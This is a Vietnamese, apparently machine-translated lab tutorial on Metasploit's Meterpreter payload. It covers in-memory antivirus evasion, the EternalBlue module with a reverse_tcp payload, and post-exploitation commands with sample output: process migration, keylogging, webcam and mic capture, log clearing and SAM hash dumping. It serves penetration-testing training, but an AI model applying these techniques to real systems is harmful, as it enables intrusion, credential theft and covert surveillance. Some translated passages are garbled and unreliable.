Meterpreter là một Tải trọng hỗ trợ quá trình kiểm thử xâm nhập với nhiều thành phần có giá trị. Chương trình sẽ chạy trên hệ thống mục tiêu và hoạt động như một tác nhân trong kiến ​​trúc điều khiển và kiểm soát. Bạn sẽ tương tác với hệ điều hành và các tập tin của mục tiêu và sử dụng các lệnh chuyên biệt của Meterpreter.

Meterpreter có nhiều phiên bản khác nhau, mỗi phiên bản sẽ cung cấp các chức năng khác nhau tùy thuộc vào hệ thống mục tiêu.

Làm thế nào Meterpreter lam việc?

Chương trình  Meterpreter chạy trên hệ thống mục tiêu nhưng không được cài đặt trên đó. Nó chạy trong bộ nhớ và không ghi dữ liệu vào ổ đĩa trên hệ thống mục tiêu. Tính năng này nhằm mục đích tránh bị phát hiện trong quá trình quét virus. Theo mặc định, hầu hết phần mềm diệt virus sẽ quét các tệp mới trên ổ đĩa (ví dụ: khi bạn tải xuống một tệp từ internet). Meterpreter chạy trong bộ nhớ ( RAM - Bộ nhớ truy cập ngẫu nhiên (RAM) để tránh việc phải ghi tệp vào đĩa trên hệ thống đích (ví dụ: meterpreter.exe). Bằng cách này, Meterpreter sẽ được xem như một tiến trình chứ không phải là một tập tin trên hệ thống đích.

Meterpreter cũng nhằm mục đích tránh bị phát hiện bởi các hệ thống dựa trên mạng. (Hệ thống ngăn chặn xâm nhập) và IDS - Các giải pháp (Hệ thống phát hiện xâm nhập) bằng cách sử dụng giao tiếp mã hóa với máy chủ, nơi mà Meterpreter chạy (thường là máy tấn công của bạn). Nếu tổ chức mục tiêu không giải mã và kiểm tra lưu lượng truy cập được mã hóa (ví dụ: HTTPS) đến và đi từ mạng cục bộ, IPS Và IDS các giải pháp sẽ không thể phát hiện ra hoạt động của nó.

Trong khi Meterpreter Tính năng này được các phần mềm diệt virus lớn nhận diện, giúp tăng cường khả năng hoạt động bí mật ở một mức độ nhất định.

Ví dụ bên dưới cho thấy một máy tính Windows mục tiêu bị khai thác bằng lỗ hổng MS17-010. Bạn sẽ thấy  Meterpreter đang chạy với ID tiến trình ( PID ) của năm 1304; điều này Trường hợp của bạn sẽ khác. Chúng tôi đã sử dụng `getpid` Lệnh này trả về ID tiến trình mà Meterpreter đang chạy. ID tiến trình (hoặc mã định danh tiến trình) được hệ điều hành sử dụng để xác định các tiến trình đang chạy. Tất cả các tiến trình chạy trong Linux hoặc Windows đều có một số ID duy nhất; số này được sử dụng để tương tác với tiến trình khi cần thiết (ví dụ: nếu cần dừng tiến trình). 

```
meterpreter > getpid 
Current pid: 1304
```

Nếu chúng ta liệt kê các tiến trình đang chạy trên hệ thống mục tiêu bằng cách sử dụng `ps` Khi thực hiện lệnh này, ta thấy PID 1304 là `spoolsv.exe` chứ không phải `Meterpreter.exe` như người ta thường nghĩ. 

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
```

Ngay cả khi chúng ta tiến thêm một bước nữa và xem xét các DLL (Thư viện liên kết động) được sử dụng bởi Meterppreter quá trình ( 1304 trong trường hợp này), chúng ta vẫn sẽ không thấy bất cứ thứ gì nhảy bổ vào mình (ví dụ: meterpreter.dll) 

```
C:\Windows\system32>tasklist /m /fi "pid eq 1304"
tasklist /m /fi "pid eq 1304"

Image Name                     PID Modules                                     
========================= ======== ============================================
spoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,    
                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        
                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  
                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   
                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      
                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         
                                   NSI.dll, IMM32.DLL, MSCTF.dll,              
                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    
                                   secur32.dll, SSPICLI.DLL, credssp.dll,      
                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      
                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     
                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         
                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         
                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      
                                   srvcli.dll, winspool.drv,                   
                                   PrintIsolationProxy.dll, FXSMON.DLL,        
                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       
                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        
                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       
                                   webservices.dll, FirewallAPI.dll,           
                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        
                                   winprint.dll, USERENV.dll, profapi.dll,     
                                   GPAPI.dll, dsrole.dll, win32spl.dll,        
                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          
                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        
                                   cscapi.dll, netutils.dll, WININET.dll,      
                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      
                                   webio.dll, SHELL32.dll, MPR.dll,            
                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        
                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     
                                   apphelp.dll, NLAapi.dll, napinsp.dll,       
                                   pnrpnsp.dll, winrnr.dll                     

C:\Windows\system32>
```

Meterpreter có rất nhiều phiên bản khác nhau để bạn lựa chọn dựa trên hệ thống mục tiêu của mình.

Cách dễ nhất để nắm được thông tin về những thứ có sẵn trong là Meterpreter. Các phiên bản có thể được liệt kê bằng msfvenom, như hình bên dưới. 
Sử dụng `msfvenom --list payloads` lệnh và tìm kiếm các payload "meterpreter" (thêm `| grep meterpreter` (vào dòng lệnh), vì vậy đầu ra chỉ hiển thị những thông tin này. Bạn có thể thử lệnh này trên AttackBox. 

````
           
root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter
    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection
    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker [...]
````
Danh sách sẽ hiển thị Meterpreter các phiên bản có sẵn cho các nền tảng sau:

Android
Hệ điều hành iOS của Apple
Java
Linux
OSX
PHP
Python
Windows 

Bạn quyết định chọn phiên bản Meterpreter nào. Việc sử dụng phương án nào chủ yếu sẽ dựa trên ba yếu tố:

    Hệ điều hành mục tiêu (Có phải là hệ điều hành mục tiêu không?) Linux (Hay là Windows? Đó có phải là thiết bị Mac không? Đó có phải là điện thoại Android không? v.v.)
    Các thành phần có sẵn trên hệ thống mục tiêu (Đã cài đặt Python chưa? Đây có phải là trang web PHP không? v.v.)
    Các loại kết nối mạng bạn có thể sử dụng với hệ thống mục tiêu (Hệ thống đó có cho phép kết nối TCP thô không? Bạn chỉ có thể sử dụng kết nối ngược HTTPS? Địa chỉ IPv6 có được giám sát ít hơn so với địa chỉ IPv4 không? v.v.)

Nếu bạn không sử dụng Meterpreter Là một payload độc lập được tạo ra bởi Msfvenom, lựa chọn của bạn cũng có thể bị hạn chế bởi lỗ hổng bảo mật. Bạn sẽ nhận thấy một số lỗ hổng bảo mật sẽ có một lựa chọn mặc định. Meterpreter tải trọng, như bạn có thể thấy trong ví dụ bên dưới với `ms17_010_eternalblue` khai thác.

 ```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
Bạn cũng có thể liệt kê các tải trọng khả dụng khác bằng cách sử dụng `show payloads` lệnh với bất kỳ mô-đun nào. 
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   windows/x64/meterpreter/bind_named_pipe                      manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager [...]
```

Đánh máy `help`trên bất kỳ phiên Meterpreter nào (được hiển thị bởi) `meterpreter>` (tại dấu nhắc) sẽ liệt kê tất cả các lệnh có sẵn. 

```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel[...]
```

Mọi phiên bản của Meterpreter sẽ có các tùy chọn lệnh khác nhau, vì vậy khi chạy helpSử dụng lệnh luôn là một ý tưởng hay. Các lệnh là những công cụ tích hợp sẵn có trên Meterpreter. Chúng sẽ chạy trên hệ thống mục tiêu mà không cần tải thêm bất kỳ tập lệnh hoặc tệp thực thi nào.

Meterpreter sẽ cung cấp cho bạn ba loại công cụ chính;

    Lệnh tích hợp sẵn
    Công cụ đo lường
    Lập trình kịch bản Meterpreter

Nếu bạn chạy `help` lệnh, bạn sẽ thấy Meterpreter Các lệnh được liệt kê theo các danh mục khác nhau.

    Các lệnh cốt lõi
    Lệnh hệ thống tập tin
    Lệnh mạng
    Lệnh hệ thống
    Các lệnh giao diện người dùng
    Lệnh webcam
    Lệnh đầu ra âm thanh
    Nâng cao lệnh
    Lệnh cơ sở dữ liệu mật khẩu
    Lệnh Timestomp

Xin lưu ý rằng danh sách trên được lấy từ kết quả đầu ra của... `help` Lệnh này áp dụng cho phiên bản Meterpreter trên Windows (`windows/x64/meterpreter/reverse_tcp`). Các lệnh này sẽ khác nhau đối với các phiên bản Meterpreter khác. 

Lệnh Meterpreter

Các lệnh cốt lõi sẽ hữu ích để điều hướng và tương tác với hệ thống mục tiêu. Dưới đây là một số lệnh được sử dụng phổ biến nhất. Hãy nhớ kiểm tra tất cả các lệnh có sẵn bằng cách chạy lệnh help sau khi phiên Meterpreter đã bắt đầu.

Các lệnh cốt lõi

    background: Bối cảnh của phiên hiện tại
    exit: Kết thúc phiên Meterpreter
    guidLấy GUID (Mã định danh duy nhất toàn cầu) của phiên.
    helpHiển thị menu trợ giúp
    infoHiển thị thông tin về một mô-đun Bài đăng.
    irb: Mở một trình shell Ruby tương tác trên phiên hiện tại
    load: Tải một hoặc nhiều tiện ích mở rộng Meterpreter
    migrateCho phép bạn di chuyển Meterpreter sang một quy trình khác
    run: Thực thi một tập lệnh Meterpreter hoặc mô-đun Post
    sessionsChuyển nhanh sang phiên khác

Lệnh hệ thống tập tin

    cdSẽ thay đổi thư mục
    ls: Sẽ liệt kê các tập tin trong thư mục hiện tại (lệnh `dir` cũng được)
    pwd: In ra thư mục làm việc hiện tại
    edit: cho phép bạn chỉnh sửa tệp
    cat: Sẽ hiển thị nội dung của một tập tin lên màn hình
    rm: Sẽ xóa tệp được chỉ định
    searchSẽ tìm kiếm các tệp
    upload: Sẽ tải lên một tập tin hoặc thư mục
    download: Sẽ tải xuống một tập tin hoặc thư mục

Lệnh mạng

    arpHiển thị máy chủ ARP (Giao thức phân giải địa chỉ) bộ nhớ đệm
    ifconfigHiển thị các giao diện mạng khả dụng trên hệ thống mục tiêu.
    netstatHiển thị các kết nối mạng.
    portfwdChuyển tiếp cổng cục bộ đến một dịch vụ từ xa.
    routeCho phép bạn xem và chỉnh sửa bảng định tuyến.

Lệnh hệ thống

    clearevXóa nhật ký sự kiện
    execute: Thực thi một lệnh
    getpidHiển thị mã định danh tiến trình hiện tại.
    getuidHiển thị cho người dùng biết Meterpreter đang chạy.
    kill: Kết thúc một tiến trình
    pkill: Kết thúc các tiến trình theo tên
    psLiệt kê các tiến trình đang chạy
    rebootKhởi động lại máy tính từ xa.
    shell: Truy cập vào trình thông dịch lệnh hệ thống
    shutdownTắt máy tính từ xa.
    sysinfo: Lấy thông tin về hệ thống từ xa, chẳng hạn như hệ điều hành.

Các lệnh khác (các lệnh này sẽ được liệt kê trong các danh mục menu khác nhau trong menu trợ giúp)

    idletimeTrả về số giây người dùng từ xa không hoạt động.
    keyscan_dump: Xuất bộ đệm phím bấm
    keyscan_startBắt đầu ghi lại các thao tác gõ phím
    keyscan_stopNgừng ghi lại các thao tác gõ phím
    screenshareCho phép bạn theo dõi màn hình máy tính của người dùng từ xa trong thời gian thực.
    screenshotChụp ảnh màn hình của giao diện máy tính tương tác.
    record_micGhi âm từ micro mặc định trong X giây.
    webcam_chatBắt đầu cuộc trò chuyện video
    webcam_listLiệt kê các webcam
    webcam_snapChụp ảnh từ webcam được chỉ định.
    webcam_streamPhát luồng video từ webcam được chỉ định.
    getsystem: Nỗ lực nâng cao đặc quyền của bạn lên ngang tầm với hệ thống địa phương
    hashdump: Xuất nội dung của cơ sở dữ liệu SAM

Mặc dù tất cả các lệnh này có vẻ đều có sẵn trong menu trợ giúp, nhưng không phải tất cả đều hoạt động. Ví dụ, hệ thống mục tiêu có thể không có webcam, hoặc nó có thể đang chạy trên máy tính trong phòng thí nghiệm mà không có môi trường máy tính để bàn phù hợp. 

Cái `getuid` Lệnh này sẽ hiển thị người dùng hiện đang chạy Meterpreter. Điều này sẽ giúp bạn hình dung được cấp độ quyền hạn của mình trên hệ thống mục tiêu (ví dụ: Bạn là người dùng cấp quản trị như `NT AUTHORITY\SYSTEM` hay chỉ là người dùng thông thường?). 
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

Cái `ps` Lệnh này sẽ liệt kê các tiến trình đang chạy. Cột PID cũng sẽ cung cấp cho bạn thông tin PID cần thiết để di chuyển Meterpreter sang một tiến trình khác. 
```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 724   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 764   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 828   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 864   828   WmiPrvSE.exe                                                       
 900   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 952   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1076  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1164  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1168  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 1244  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe[...]
```

Migrate

Việc chuyển sang quy trình khác sẽ giúp ích Meterpreter Tương tác với nó. Ví dụ, nếu bạn thấy một trình xử lý văn bản đang chạy trên máy mục tiêu (ví dụ: word.exe, notepad.exe, v.v.), bạn có thể chuyển sang trình xử lý đó và bắt đầu thu thập các phím bấm mà người dùng gửi đến tiến trình này. Một số Meterpreter các phiên bản sẽ cung cấp cho bạn `keyscan_start`, `keyscan_stop`, Và `keyscan_dump` Các tùy chọn lệnh để khiến Meterpreter hoạt động như một trình ghi nhật ký bàn phím. Chuyển sang một tiến trình khác cũng có thể giúp bạn có một phiên Meterpreter ổn định hơn.

Để di chuyển đến bất kỳ tiến trình nào, bạn cần nhập lệnh migrate theo sau là PID của tiến trình mục tiêu mong muốn. Ví dụ bên dưới cho thấy Meterpreter đang di chuyển đến tiến trình có ID 716. 

```
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
meterpreter >
```

Hãy cẩn thận; bạn có thể mất quyền người dùng nếu chuyển từ người dùng có quyền cao hơn (ví dụ: SYSTEM) sang tiến trình được khởi chạy bởi người dùng có quyền thấp hơn (ví dụ: máy chủ web). Bạn có thể không lấy lại được quyền đó

Hashdump

Cái hashdumpLệnh này sẽ liệt kê nội dung của cơ sở dữ liệu SAM. Cơ sở dữ liệu SAM (Security Account Manager) lưu trữ mật khẩu người dùng trên hệ thống Windows. Các mật khẩu này được lưu trữ ở định dạng NTLM ( New Technology LAN Manager) . 

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter >
```

Mặc dù về mặt toán học không thể "giải mã" các hàm băm này, bạn vẫn có thể tìm ra mật khẩu dạng văn bản gốc bằng cách sử dụng các công cụ trực tuyến. NTLM các cơ sở dữ liệu hoặc tấn công bảng cầu vồng. Các hàm băm này cũng có thể được sử dụng trong các cuộc tấn công Pass-the-Hash để xác thực với các hệ thống khác rằng những người dùng này có thể truy cập cùng một mạng. 

Search

Cái `search` Lệnh này rất hữu ích để định vị các tệp có chứa thông tin quan trọng. Trong bối cảnh CTF, nó có thể được sử dụng để nhanh chóng tìm thấy tệp cờ hoặc tệp bằng chứng, trong khi trong các cuộc kiểm thử xâm nhập thực tế, bạn có thể cần tìm kiếm các tệp do người dùng tạo hoặc các tệp cấu hình có thể chứa thông tin mật khẩu hoặc tài khoản. 

```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
meterpreter >
```

Shell

Lệnh `shell` sẽ khởi chạy một cửa sổ dòng lệnh thông thường trên hệ thống mục tiêu. Nhấn CTRL+Z sẽ giúp bạn quay lại cửa sổ dòng lệnh ban đầu. vỏ bọc. 

```
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
